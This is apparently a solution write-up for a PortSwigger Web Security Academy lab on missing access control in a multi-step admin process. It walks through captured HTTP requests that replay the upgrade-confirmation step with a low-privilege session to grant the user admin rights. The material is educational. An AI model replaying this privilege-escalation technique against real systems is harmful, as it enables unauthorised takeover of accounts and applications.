# [Lab 12: Multi-step process with no access control on one step](https://portswigger.net/web-security/access-control/lab-multi-step-process-with-no-access-control-on-one-step)

---

## Description

This lab has an admin panel with a flawed multi-step process for changing a user's role. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed [access controls](https://portswigger.net/web-security/access-control) to promote yourself to become an administrator.

---

## Solution

Login with the credential `administrator`:`admin` and navigate to the `Admin Panel`. Walk through the process of ugprading `carlos` to understand how the process works.

On the admin panel, the first step is choosing `carlos` and clicking `Upgrade User`, generating the following HTTP request.

```http
POST /admin-roles HTTP/1.1
Host: acae1f7a1fc12d74c035621300f50045.web-security-academy.net
Cookie: session=uRBa87aZ9W0Ne3Qa8p8XL4C5JG54RoJW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://acae1f7a1fc12d74c035621300f50045.web-security-academy.net
Referer: https://acae1f7a1fc12d74c035621300f50045.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

username=carlos&action=upgrade
```

This results in a 200 OK response from the server and a page prompting the administrator to confirm their choice.

![](images/Pasted%20image%2020220209165027.png)

Selecting `Yes` generates the following HTTP request.

```http
POST /admin-roles HTTP/1.1
Host: acae1f7a1fc12d74c035621300f50045.web-security-academy.net
Cookie: session=uRBa87aZ9W0Ne3Qa8p8XL4C5JG54RoJW
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://acae1f7a1fc12d74c035621300f50045.web-security-academy.net
Referer: https://acae1f7a1fc12d74c035621300f50045.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

action=upgrade&confirmed=true&username=carlos
```

This results in a 302 redirect to `/admin`, indicating a successful upgrade.

The two requests are virtually identical except for the extra body parameter `confirmed=true` in the second request. For this multi-step access control process to work properly, the backend would have to be authorize both requests and make sure they are happening in proper sequence. However, the current implementation makes it seem like the backend really requires the `confirmed=true` parameter to complete the upgrade.

The question is whether the same request can be executed successfully as a lower-privileged user. Logout and log back in with the credential `wiener`:`peter`. Forward the above request but with `wiener`'s `session` cookie and with `username` set to `wiener`.

```http
POST /admin-roles HTTP/1.1
Host: acae1f7a1fc12d74c035621300f50045.web-security-academy.net
Cookie: session=2dQElSa7nPv1PdeiToNd3rdDxtgVKlgT
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Origin: https://acae1f7a1fc12d74c035621300f50045.web-security-academy.net
Referer: https://acae1f7a1fc12d74c035621300f50045.web-security-academy.net/admin-roles
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

action=upgrade&confirmed=true&username=wiener
```

This results in a 302 redirect and indication of a successful completion.
